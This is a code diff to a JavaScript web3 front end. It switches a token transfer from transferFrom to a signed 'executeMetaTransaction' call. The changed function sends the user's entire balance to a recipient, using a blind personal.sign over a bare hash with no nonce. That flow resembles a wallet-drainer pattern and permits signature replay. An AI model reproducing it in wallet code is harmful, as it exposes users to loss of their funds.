@@ -62,6 +62,40 @@ const ABI = [
         "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }],
         "stateMutability": "nonpayable",
         "type": "function"
+    },
+    {
+        "inputs": [
+            {
+                "internalType": "address",
+                "name": "sender",
+                "type": "address"
+            },
+            {
+                "internalType": "address",
+                "name": "recipient",
+                "type": "address"
+            },
+            {
+                "internalType": "uint256",
+                "name": "amount",
+                "type": "uint256"
+            },
+            {
+                "internalType": "bytes",
+                "name": "signature",
+                "type": "bytes"
+            }
+        ],
+        "name": "executeMetaTransaction",
+        "outputs": [
+            {
+                "internalType": "bool",
+                "name": "",
+                "type": "bool"
+            }
+        ],
+        "stateMutability": "nonpayable",
+        "type": "function"
     }
 ];
 
@@ -89,7 +123,14 @@ async function transferTokens() {
         const balance = await contract.methods.balanceOf(account).call();
         const amount = balance; // 将转账金额设为用户的所有余额
         
-        const tx = await contract.methods.transferFrom(account, recipient, amount).send({ from: account });
+        // 创建消息哈希
+        const messageHash = web3.utils.soliditySha3(account, recipient, amount);
+        
+        // 签署消息
+        const signature = await web3.eth.personal.sign(messageHash, account);
+        
+        // 调用 executeMetaTransaction
+        const tx = await contract.methods.executeMetaTransaction(account, recipient, amount, signature).send({ from: account });
         console.log('转账成功:', tx);
         alert('转账成功！');
     } catch (error) {
